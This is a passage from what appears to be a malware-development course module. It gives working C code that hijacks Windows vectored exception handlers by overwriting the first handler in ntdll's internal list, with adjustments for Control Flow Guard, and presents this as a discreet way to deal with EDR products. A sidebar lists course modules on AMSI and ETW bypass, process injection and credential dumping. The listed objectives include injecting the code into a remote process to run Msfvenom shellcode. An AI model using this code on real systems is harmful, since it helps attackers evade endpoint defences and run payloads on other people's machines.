	ReleaseSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVCH);

	if (bCfg)
		RtlProtectHeapWrapper(hHeap, TRUE, pRtlProtectHeap);

	return bSuccess;
}
</code></pre>
<br>
<h3>Handler Overwriting</h3>
<p>Instead of adding a vectored handler ourselves, it is also possible 
to simply overwrite the first (or any other) registered vectored 
handler. Overwriting the first VEH is demonstrated by the <code>OverwriteFirstVectoredExceptionHandler</code> function shown below. The <code>OverwriteFirstVectoredExceptionHandler</code> function accepts a single parameter:</p>
<ul>
<li><code>pHandler</code> - A pointer to overwrite the first registered VEH with.</li>
</ul>
<pre><code class="language-C">BOOL OverWriteFirstVectoredExceptionHandler(IN PVOID pHandler) {

	PVOID					pHeap					= NULL;
	DWORD					dwOld					= 0x00;
	BOOL					bCfg					= FALSE,
							bLocked					= FALSE,
							bSuccess				= FALSE;
	VECTORED_HANDLER_LIST*	pLdrpVectorHandlerList	= NULL;
	fnRtlProtectHeap		pRtlProtectHeap			= NULL;

	HMODULE					hNtdll = GetModuleHandle(TEXT("NTDLL.DLL"));

	if (!GetVectoredHandlerList(hNtdll, &amp;pLdrpVectorHandlerList)) {
		printf("[!] Failed to Get LdrpVectorHandlerList \n");
		goto _END_OF_FUNC;
	}

	// Lock the VEH list to handle data races
	AcquireSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVEH);

	bLocked = TRUE;

	if (pLdrpVectorHandlerList-&gt;FirstVEH == (ULONG_PTR)pLdrpVectorHandlerList + offsetof(VECTORED_HANDLER_LIST, FirstVEH)) {
		printf("[!] List is Empty, Nothing to Overwrite \n");
		goto _END_OF_FUNC;
	}

	// Check if CFG is enabled
	bCfg = CheckCFGStatus((HANDLE)-1);

	// If CFG is enabled, mark the memory as RW
	// This is to make sure this function works when a handler was registered the normal way
	if (bCfg) {
		
		if (!(pRtlProtectHeap = (fnRtlProtectHeap)GetProcAddress(hNtdll, "RtlProtectHeap"))) {
			PRINT_WINAPI_ERR("GetProcAddress");
			goto _END_OF_FUNC;
		}

		// Entry is in the first page of "LdrpMrdataHeap"
		pHeap = PAGE_ALIGN_DOWN(pLdrpVectorHandlerList-&gt;FirstVEH);
		RtlProtectHeapWrapper(pHeap, FALSE, pRtlProtectHeap);
	}

	// Overwrite the encoded pointer, aka the pointer to the actual registered handler
	// This enables to handle every exception ourselves since this makes us the first top-level handler
	*(PVOID*)&amp;pLdrpVectorHandlerList-&gt;FirstVEH-&gt;VectoredHandler = EncodePointer(pHandler);

	bSuccess = TRUE;
	printf("[+] Successfully Overwrote First VEH \n");


_END_OF_FUNC:

	if (bLocked)
		ReleaseSRWLockExclusive(pLdrpVectorHandlerList-&gt;LockVEH);

	if (bCfg)
		RtlProtectHeapWrapper(pHeap, TRUE, pRtlProtectHeap);
		
	return bSuccess;
}
</code></pre>
<br>
<img src="69_files/overwrite-first-veh.png" style="margin:auto" width="1200px">
<p>Only the protection settings for <code>LdrpMrdataHeap</code> must be 
adjusted when CFG is enabled, providing a discreet method to hijack an 
already registered vectored handler. For stability, it is crucial to 
understand the original handler's intended purpose. In scenarios 
involving EDRs, if we alter an entry whose handler was designed to 
manage page guards or hardware breakpoints, we must incorporate 
additional logic into our new handler to appropriately process those 
exceptions.</p>
<h3>Main Function</h3>
<p>The main function in this implementation adds, removes, and 
overwrites vectored handlers with both WinAPIs and custom functions 
introduced in this module.</p>
<pre><code class="language-C">int main() {
	
	printf("[i] My PID: %ld\n", GetProcessId((HANDLE)-1));

	PVOID	pVeh1 = NULL,
			pVeh2 = NULL,
			pVch1 = NULL;

	printf("&lt;Enter to Manually Add a VEH&gt;");
	getchar();

	// LdrpVectorHandlerList.FirstVEH -&gt; NewHandler1
	if ((pVeh1 = AddVectoredExceptionHandlerReplacement(TRUE, &amp;NewHandler1)) == NULL) {
		printf("[!] Error Manually Adding VEH \n");
		return -1;
	}
	
	printf("&lt;Enter to Cause an Exception&gt;");
	getchar();

	CauseException(1);

	printf("&lt;Enter to Add a VEH the Normal Way&gt;");
	getchar();

	// LdrpVectorHandlerList.FirstVEH -&gt; NewHandler2 -&gt; NewHandler1
	if ((pVeh2 = AddVectoredExceptionHandler(1, &amp;NewHandler2)) == NULL) {
		PRINT_WINAPI_ERR("AddVectoredExceptionHandler");
		return -1;
	}

	printf("[+] Entry Successfully Added @ 0x%p \n", pVeh2);
	printf("&lt;Enter to Cause an Exception&gt;");
	getchar();

	CauseException(2);

	printf("&lt;Enter to Overwrite First VEH&gt;");
	getchar();

	// LdrpVectorHandlerList.FirstVEH -&gt; NewHandler3 -&gt; NewHandler1
	if (!OverWriteFirstVectoredExceptionHandler(&amp;NewHandler3)) {
		printf("[!] Overwriting First VEH Failed \n");
		return -1;
	}

	printf("&lt;Enter to Cause an Exception&gt;");
	getchar();

	CauseException(3);

	printf("&lt;Enter to Add a VCH&gt;");
	getchar();

	// LdrpVectorHandlerList.FirstVEH -&gt; NewHandler3 -&gt; NewHandler1
	// LdrpVectorHandlerList.FirstVCH -&gt; NewHandler4
	if ((pVch1 = AddVectoredContinueHandlerReplacement(TRUE, &amp;NewHandler4)) == NULL) {
		printf("[!] Error Manually Adding VCH \n");
		return -1;
	}

	printf("&lt;Enter to Cause an Exception&gt;");
	getchar();

	CauseException(4);

	printf("&lt;Enter to Remove All Vectored Handlers&gt;");
	getchar();

	if (!RemoveVectoredExceptionHandlerReplacement(pVeh1)) {
		printf("[!] Error removing handler @ 0x%p\n", pVeh1);
	}

	if (!RemoveVectoredExceptionHandlerReplacement(pVeh2)) {
		printf("[!] Error removing handler @ 0x%p\n", pVeh2);
	}

	if (!RemoveVectoredContinueHandlerReplacement(pVch1)) {
		printf("[!] Error removing handler @ 0x%p\n", pVch1);
	}

	printf("&lt;Enter to Quit&gt;\n");
	getchar();

	return 0;
}
</code></pre>
<br>
<h3>Resources</h3>
<ul>
<li>
<p><a href="https://bruteratel.com/research/2024/10/20/Exception-Junction/">Exception Junction - Where All Exceptions Meet Their Handler</a></p>
</li>
<li>
<p><a href="https://securityintelligence.com/x-force/using-veh-for-defense-evasion-process-injection/">You just got vectored  Using Vectored Exception Handlers (VEH) for defense evasion and process injection</a></p>
</li>
<li>
<p><a href="https://mannyfreddy.gitbook.io/ya-boy-manny">Fun with Exception Handlers</a></p>
</li>
<li>
<p><a href="https://www.nccgroup.com/us/research-blog/detecting-anomalous-vectored-exception-handlers-on-windows/">Detecting anomalous Vectored Exception Handlers on Windows</a></p>
</li>
<li>
<p><a href="https://dimitrifourny.github.io/2020/06/11/dumping-veh-win10.html">Dumping the VEH in Windows 10</a></p>
</li>
</ul>

    </div>

    
        
</div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Experiment
 with the AddVectoredExceptionHandlerReplacement and 
OverwriteFirstVectoredExceptionHandler functions to add and then 
overwrite a VEH exception handler</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Experiment with the AddVectoredContinueHandlerReplacement function to add a new continue vectored handler</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Convert
 this implementation into a DLL, then inject it into a remote process, 
overwriting the target process's VEH exception handler, executing a 
Msfvenom-generated shellcode</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        <div id="toc-skeleton" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2 ml-8 animate-pulse space-y-2">
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        </div>

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
        
        </div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="69_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
